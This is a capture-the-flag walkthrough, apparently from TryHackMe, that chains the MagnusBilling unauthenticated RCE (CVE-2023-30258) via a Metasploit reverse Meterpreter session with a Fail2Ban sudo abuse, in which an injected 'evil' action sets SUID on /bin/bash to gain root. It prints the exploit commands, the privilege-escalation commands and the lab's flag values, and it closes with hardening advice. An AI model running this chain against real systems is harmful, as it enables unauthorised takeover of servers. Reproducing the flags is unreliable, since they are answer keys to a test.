**From MagnusBilling RCE to Root: Chaining CVE-2023–30258 with Fail2Ban Privilege Escalation**

**Overview**
In this detailed walkthrough, we traverse each phase of compromising a vulnerable MagnusBilling instance and elevating privileges through a misconfigured Fail2Ban setup. You’ll learn:

-How simple metadata leaks guide reconnaissance
-Exploiting an unauthenticated RCE (CVE-2023–30258) via Metasploit
-Navigating the post-exploit environment to capture user flags
-Weaponizing Fail2Ban with passwordless sudo to gain root
-Defensive lessons to harden similar infrastructures

Every command, output snippet, and screenshot reference is included to make replication and learning seamless.

— -

🧐 1. **Reconnaissance**

**1.1 robots.txt Reveals a Hidden Path**

We start by checking for `robots.txt` entries that indicate hidden directories:

curl http://<target-ip>/robots.txt

User-agent: *
Disallow: /mbilling/

robots.txt

**1.2 Page Source Confirms MagnusBilling**

A quick view-source on `/mbilling/` reveals the application name:

<title>MagnusBilling</title>

View-source page

This confirms we’re targeting a known VoIP billing platform with published CVEs.

**1.3 Comprehensive Nmap Scan**

We perform an aggressive Nmap scan to enumerate open ports, services, versions, and OS details:

nmap -A <taget-ip>

Key observations:

- 22/tcp (SSH): OpenSSH 9.2p1 Debian
- 80/tcp (HTTP): Apache httpd 2.4.62
- Disallowed `/mbilling/` path in robots.txt
- Host OS fingerprint: Linux 4.15

With the software and versions identified, we move on to exploitation.

— -

💥 2. **Exploitation of CVE-2023–30258**

MagnusBilling versions 6.x and 7.x suffer from an unauthenticated RCE vulnerability in `icepay.php`. We’ll leverage Metasploit for a reliable exploit.

**2.1 Setting Up Metasploit**

Load the module and configure payload:

msfconsole -q -a
use exploit/linux/http/magnusbilling_unauth_rce_cve_2023_30258
set lhost <your-ip/vpn-ip>
set lport <port>
set rhost <target-ip>
exploit

Gaining shell through Metasploit console

Notice the eight-second sleep test confirming command injection, followed by:

[*] Meterpreter session 1 opened (10.17.68.150:4444 -> 10.10.67.16:43332)

**2.2 Transitioning to a Shell**

We pivot from the Meterpreter session to a standard bash shell:

meterpreter > shell

— -

📁 3. **Capturing the User Flag**

**3.1 Verifying Initial Access**

Inside the shell, we confirm our user context:

whoami
asterisk

User logged in as

**3.2 Reading the User Flag**

We navigate to the Magnus user’s home directory and capture the user flag:

cd /home/magnus
ls
# user.txt
cat user.txt
# THM{4a6831d5f124b25eefb1e92e0f0da4ca}

With the user flag in hand, we turn our sights to privilege escalation.

— -

🔐 4. **Privilege Escalation via Fail2Ban**

**4.1 Enumerating Sudo Rights**

We list sudo permissions available to `asterisk`:

sudo -l

The key line is:

(ALL) NOPASSWD: /usr/bin/fail2ban-client

This allows us to run Fail2Ban commands as root without a password.

**4.2 Enumerating Fail2Ban Jails**

Next, we query the Fail2Ban jails to choose a target:

sudo /usr/bin/fail2ban-client status

Active jails (including `sshd`) are listed — perfect for injecting our payload.

**4.3 Injecting and Triggering the Malicious Action**

We create a new “evil” action and configure it to run `chmod +s /bin/bash` on ban:

sudo /usr/bin/fail2ban-client set <jail> addaction evil
sudo /usr/bin/fail2ban-client set <jail> action evil actionban "chmod +s /bin/bash"
sudo /usr/bin/fail2ban-client set <jail> banip 1.2.3.5

Banning any IP triggers our “evil” action, setting the SUID bit on Bash.

— -

👑 5. **Root Shell & Final Flag**

**5.1 Spawning a Privileged Bash**

With `/bin/bash` now SUID-root, we launch a root shell:

/bin/bash -p
whoami
# root

**5.2 Extracting the Root Flag**

We move to the root directory and read the final flag:

cd /root
ls
# root.txt
cat root.txt
# THM{33ad5b530e71a172648f424ec23fae60}

— -

🧠 6. **Key Takeaways**

- Metadata Matters: robots.txt and HTML titles can directly point to exploitable apps.
- Least Privilege: Allowing passwordless sudo on security tools turns defense into attack.
- Chaining Flaws: Combining RCE with an abused security utility leads to rapid full compromise.

— -

📝 7. **Conclusion & Next Steps**

This write-up covers the full attack chain — from reconnaissance to root — illustrating how seemingly minor oversights can cascade into total system takeover. To harden against similar attacks:

    Restrict sudo permissions to only necessary commands and users.
    Patch web applications promptly against known CVEs.
    Audit and monitor security-tool configurations regularly.

Feel free to adapt this walkthrough into your own post, share it with your team, or use it as a blueprint for auditing your infrastructure.
